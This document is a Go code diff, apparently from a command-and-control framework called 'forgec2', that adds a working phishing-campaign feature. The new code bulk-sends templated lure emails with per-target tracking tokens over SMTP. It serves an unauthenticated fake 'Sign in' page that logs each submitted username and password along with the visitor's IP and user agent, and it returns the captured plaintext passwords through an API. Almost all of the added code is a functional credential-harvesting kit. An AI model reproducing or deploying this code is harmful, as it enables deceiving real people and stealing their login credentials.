@@ -1,7 +1,14 @@
 package server
 
 import (
+	"crypto/rand"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"log/slog"
 	"net/http"
+	"net/smtp"
+	"strings"
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
@@ -10,13 +17,13 @@ import (
 
 func (s *Server) handleAPIPhishingTemplates(c *gin.Context) {
 	var templates []db.PhishingTemplate
-	s.db.Order("created_at desc").Find(&templates)
+	s.db.Order("created_at desc").Limit(200).Find(&templates)
 	respond(c, gin.H{"data": templates})
 }
 
 func (s *Server) handleAPIPhishingCampaigns(c *gin.Context) {
 	var campaigns []db.PhishingCampaign
-	s.db.Order("created_at desc").Find(&campaigns)
+	s.db.Order("created_at desc").Limit(200).Find(&campaigns)
 	respond(c, gin.H{"data": campaigns})
 }
 
@@ -34,9 +41,20 @@ func (s *Server) handleAPIPhishingCaptures(c *gin.Context) {
 	}
 	captures := make([]captureEntry, 0, len(events))
 	for _, e := range events {
+		user, pass := "", ""
+		var payload map[string]string
+		if e.Payload != "" {
+			_ = json.Unmarshal([]byte(e.Payload), &payload)
+			user = payload["username"]
+			pass = payload["password"]
+		}
+		if user == "" {
+			user = e.Email
+		}
 		captures = append(captures, captureEntry{
 			ID:        e.ID,
-			Username:  e.Email,
+			Username:  user,
+			Password:  pass,
 			Source:    e.IP,
 			Type:      e.EventType,
 			CreatedAt: e.CreatedAt.Format(time.RFC3339),
@@ -86,8 +104,7 @@ func (s *Server) handleAPICreatePhishingTemplate(c *gin.Context) {
 func (s *Server) handleAPIUpdatePhishingTemplate(c *gin.Context) {
 	id := c.Param("id")
 	var tpl db.PhishingTemplate
-	if err := s.db.First(&tpl, "id = ?", id).Error; err != nil {
-		respondError(c, http.StatusNotFound, "template not found")
+	if !s.findOrFail(c, &tpl, id, "template") {
 		return
 	}
 	var req struct {
@@ -184,17 +201,145 @@ func (s *Server) handleAPICreatePhishingCampaign(c *gin.Context) {
 	respond(c, gin.H{"success": true, "id": camp.ID})
 }
 
+func parsePhishingTargets(raw string) []string {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil
+	}
+	var list []string
+	if strings.HasPrefix(raw, "[") {
+		_ = json.Unmarshal([]byte(raw), &list)
+	}
+	if len(list) == 0 {
+		// newline / comma / semicolon separated
+		replacer := strings.NewReplacer("\r\n", "\n", ";", "\n", ",", "\n")
+		for _, line := range strings.Split(replacer.Replace(raw), "\n") {
+			line = strings.TrimSpace(line)
+			if line != "" && strings.Contains(line, "@") {
+				list = append(list, line)
+			}
+		}
+	}
+	// de-dupe
+	seen := make(map[string]struct{}, len(list))
+	out := make([]string, 0, len(list))
+	for _, e := range list {
+		e = strings.TrimSpace(strings.ToLower(e))
+		if e == "" || !strings.Contains(e, "@") {
+			continue
+		}
+		if _, ok := seen[e]; ok {
+			continue
+		}
+		seen[e] = struct{}{}
+		out = append(out, e)
+	}
+	return out
+}
+
+func phishingToken() string {
+	b := make([]byte, 16)
+	if _, err := rand.Read(b); err != nil {
+		return fmt.Sprintf("%d", time.Now().UnixNano())
+	}
+	return hex.EncodeToString(b)
+}
+
+func (s *Server) phishingBaseURL() string {
+	scheme := "http"
+	if s.cfg.Server.TLSEnabled {
+		scheme = "https"
+	}
+	host := s.cfg.Server.Host
+	if host == "" || host == "0.0.0.0" {
+		host = "127.0.0.1"
+	}
+	return fmt.Sprintf("%s://%s:%d", scheme, host, s.cfg.Server.Port)
+}
+
+func renderPhishingBody(body, email, token, landingURL string) string {
+	r := strings.NewReplacer(
+		"{{email}}", email,
+		"{{EMAIL}}", email,
+		"{{token}}", token,
+		"{{TOKEN}}", token,
+		"{{landing_url}}", landingURL,
+		"{{LANDING_URL}}", landingURL,
+		"{{track_url}}", landingURL,
+	)
+	return r.Replace(body)
+}
+
+func sendPhishingMail(host string, port int, user, pass, from, to, subject, body string, html bool) error {
+	if port <= 0 {
+		port = 587
+	}
+	addr := fmt.Sprintf("%s:%d", host, port)
+	var auth smtp.Auth
+	if user != "" {
+		auth = smtp.PlainAuth("", user, pass, host)
+	}
+	contentType := "text/plain; charset=\"UTF-8\""
+	if html {
+		contentType = "text/html; charset=\"UTF-8\""
+	}
+	msg := strings.Builder{}
+	msg.WriteString(fmt.Sprintf("From: %s\r\n", from))
+	msg.WriteString(fmt.Sprintf("To: %s\r\n", to))
+	msg.WriteString(fmt.Sprintf("Subject: %s\r\n", subject))
+	msg.WriteString("MIME-Version: 1.0\r\n")
+	msg.WriteString(fmt.Sprintf("Content-Type: %s\r\n", contentType))
+	msg.WriteString("\r\n")
+	msg.WriteString(body)
+	return smtp.SendMail(addr, auth, extractEmailAddr(from), []string{to}, []byte(msg.String()))
+}
+
+func extractEmailAddr(from string) string {
+	from = strings.TrimSpace(from)
+	if i := strings.LastIndex(from, "<"); i >= 0 {
+		if j := strings.LastIndex(from, ">"); j > i {
+			return strings.TrimSpace(from[i+1 : j])
+		}
+	}
+	return from
+}
+
 func (s *Server) handleAPILaunchPhishingCampaign(c *gin.Context) {
 	id := c.Param("id")
 	var camp db.PhishingCampaign
-	if err := s.db.First(&camp, "id = ?", id).Error; err != nil {
-		respondError(c, http.StatusNotFound, "campaign not found")
+	if !s.findOrFail(c, &camp, id, "campaign") {
 		return
 	}
 	if camp.Status == "running" {
 		respondError(c, http.StatusBadRequest, "campaign is already running")
 		return
 	}
+
+	var tpl db.PhishingTemplate
+	if camp.TemplateID == 0 || s.db.First(&tpl, camp.TemplateID).Error != nil {
+		respondError(c, http.StatusBadRequest, "campaign template not found")
+		return
+	}
+	targets := parsePhishingTargets(camp.TargetList)
+	if len(targets) == 0 {
+		respondError(c, http.StatusBadRequest, "no valid targets in target_list")
+		return
+	}
+	if camp.SMTPHost == "" {
+		respondError(c, http.StatusBadRequest, "smtp_host is required")
+		return
+	}
+
+	smtpPass, err := decryptSecret(camp.SMTPPass, s.cfg.Server.JWTSecret)
+	if err != nil {
+		// fallback: treat as plaintext for legacy rows
+		smtpPass = camp.SMTPPass
+	}
+	if tpl.FromEmail == "" {
+		respondError(c, http.StatusBadRequest, "template from_email is required")
+		return
+	}
+
 	camp.Status = "running"
 	camp.SentCount = 0
 	camp.OpenCount = 0
@@ -204,14 +349,83 @@ func (s *Server) handleAPILaunchPhishingCampaign(c *gin.Context) {
 		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Phishing operation"))
 		return
 	}
-	respond(c, gin.H{"success": true})
+
+	baseURL := s.phishingBaseURL()
+	from := tpl.FromEmail
+	if tpl.FromName != "" {
+		from = fmt.Sprintf("%s <%s>", tpl.FromName, tpl.FromEmail)
+	}
+	isHTML := tpl.Type != "text" && tpl.Type != "plain"
+
+	// async send to avoid blocking the API
+	go s.runPhishingCampaign(camp.ID, tpl, targets, camp.SMTPHost, camp.SMTPPort, camp.SMTPUser, smtpPass, from, isHTML, baseURL)
+
+	s.LogAuditRecord(c, "launch_phishing_campaign", "phishing_campaign", id,
+		fmt.Sprintf("queued %d recipients via %s", len(targets), camp.SMTPHost), true, nil)
+	respond(c, gin.H{
+		"success":   true,
+		"queued":    len(targets),
+		"message":   fmt.Sprintf("Campaign launched. Queued %d emails for SMTP delivery.", len(targets)),
+	})
+}
+
+func (s *Server) runPhishingCampaign(campID uint, tpl db.PhishingTemplate, targets []string, smtpHost string, smtpPort int, smtpUser, smtpPass, from string, isHTML bool, baseURL string) {
+	sent := 0
+	for _, email := range targets {
+		// stop if campaign was stopped
+		var camp db.PhishingCampaign
+		if err := s.db.First(&camp, campID).Error; err != nil || camp.Status != "running" {
+			slog.Info("phishing campaign stopped mid-send", "campaign", campID, "sent", sent)
+			return
+		}
+
+		token := phishingToken()
+		landing := fmt.Sprintf("%s/phishing/l/%s", baseURL, token)
+		body := renderPhishingBody(tpl.Body, email, token, landing)
+		// append landing link if template didn't include one
+		if !strings.Contains(body, landing) && !strings.Contains(strings.ToLower(body), "{{landing") {
+			if isHTML {
+				body += fmt.Sprintf(`<p><a href="%s">Continue</a></p>`, landing)
+			} else {
+				body += "\n\n" + landing + "\n"
+			}
+		}
+		subject := renderPhishingBody(tpl.Subject, email, token, landing)
+
+		evt := db.PhishingEvent{
+			CampaignID: campID,
+			Token:      token,
+			Email:      email,
+			EventType:  "sent",
+			Payload:    "",
+			CreatedAt:  time.Now(),
+		}
+
+		if err := sendPhishingMail(smtpHost, smtpPort, smtpUser, smtpPass, from, email, subject, body, isHTML); err != nil {
+			slog.Warn("phishing send failed", "campaign", campID, "to", email, "err", err)
+			evt.EventType = "send_failed"
+			payload, _ := json.Marshal(map[string]string{"error": err.Error()})
+			evt.Payload = string(payload)
+		} else {
+			sent++
+			s.db.Model(&db.PhishingCampaign{}).Where("id = ?", campID).
+				Updates(map[string]interface{}{"sent_count": sent, "updated_at": time.Now()})
+		}
+		s.db.Create(&evt)
+
+		// light throttle to avoid SMTP rate limits
+		time.Sleep(200 * time.Millisecond)
+	}
+
+	s.db.Model(&db.PhishingCampaign{}).Where("id = ? AND status = ?", campID, "running").
+		Updates(map[string]interface{}{"status": "completed", "updated_at": time.Now()})
+	slog.Info("phishing campaign finished", "campaign", campID, "sent", sent, "total", len(targets))
 }
 
 func (s *Server) handleAPIStopPhishingCampaign(c *gin.Context) {
 	id := c.Param("id")
 	var camp db.PhishingCampaign
-	if err := s.db.First(&camp, "id = ?", id).Error; err != nil {
-		respondError(c, http.StatusNotFound, "campaign not found")
+	if !s.findOrFail(c, &camp, id, "campaign") {
 		return
 	}
 	camp.Status = "completed"
@@ -231,4 +445,75 @@ func (s *Server) handleAPIDeletePhishingCampaign(c *gin.Context) {
 	}
 	s.LogAuditRecord(c, "delete_phishing_campaign", "phishing_campaign", id, "Phishing campaign deleted", true, nil)
 	respond(c, gin.H{"success": true})
+}
+
+// Public landing page for credential capture (no auth).
+func (s *Server) handlePhishingLanding(c *gin.Context) {
+	token := c.Param("token")
+	if token == "" {
+		c.String(http.StatusNotFound, "not found")
+		return
+	}
+	var evt db.PhishingEvent
+	if err := s.db.Where("token = ?", token).Order("id asc").First(&evt).Error; err != nil {
+		c.String(http.StatusNotFound, "not found")
+		return
+	}
+
+	// open tracking on first GET
+	if c.Request.Method == http.MethodGet {
+		open := db.PhishingEvent{
+			CampaignID: evt.CampaignID,
+			Token:      token,
+			Email:      evt.Email,
+			EventType:  "open",
+			IP:         c.ClientIP(),
+			UserAgent:  c.GetHeader("User-Agent"),
+			CreatedAt:  time.Now(),
+		}
+		s.db.Create(&open)
+		s.db.Exec("UPDATE phishing_campaigns SET open_count = open_count + 1, updated_at = ? WHERE id = ?", time.Now(), evt.CampaignID)
+
+		c.Header("Content-Type", "text/html; charset=utf-8")
+		c.String(http.StatusOK, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign in</title>
+<style>body{font-family:system-ui,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);width:100%%;max-width:360px}
+h1{font-size:1.25rem;margin:0 0 1rem}label{display:block;font-size:.8rem;color:#555;margin:.75rem 0 .25rem}
+input{width:100%%;padding:.6rem .75rem;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
+button{margin-top:1.25rem;width:100%%;padding:.7rem;border:0;border-radius:8px;background:#2563eb;color:#fff;font-weight:600;cursor:pointer}
+</style></head><body><div class="card"><h1>Sign in</h1>
+<form method="POST" action="/phishing/l/%s">
+<label>Email</label><input name="username" type="email" value="%s" required>
+<label>Password</label><input name="password" type="password" required>
+<button type="submit">Continue</button>
+</form></div></body></html>`, token, evt.Email)
+		return
+	}
+
+	// POST capture
+	username := c.PostForm("username")
+	password := c.PostForm("password")
+	if username == "" {
+		username = c.PostForm("email")
+	}
+	payload, _ := json.Marshal(map[string]string{
+		"username": username,
+		"password": password,
+	})
+	cap := db.PhishingEvent{
+		CampaignID: evt.CampaignID,
+		Token:      token,
+		Email:      evt.Email,
+		EventType:  "capture",
+		Payload:    string(payload),
+		IP:         c.ClientIP(),
+		UserAgent:  c.GetHeader("User-Agent"),
+		CreatedAt:  time.Now(),
+	}
+	s.db.Create(&cap)
+	s.db.Exec("UPDATE phishing_campaigns SET cred_count = cred_count + 1, updated_at = ? WHERE id = ?", time.Now(), evt.CampaignID)
+
+	c.Header("Content-Type", "text/html; charset=utf-8")
+	c.String(http.StatusOK, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Thank you</title></head>
+<body style="font-family:system-ui;text-align:center;padding:4rem"><h2>Thank you</h2><p>Your request is being processed.</p></body></html>`)
 }
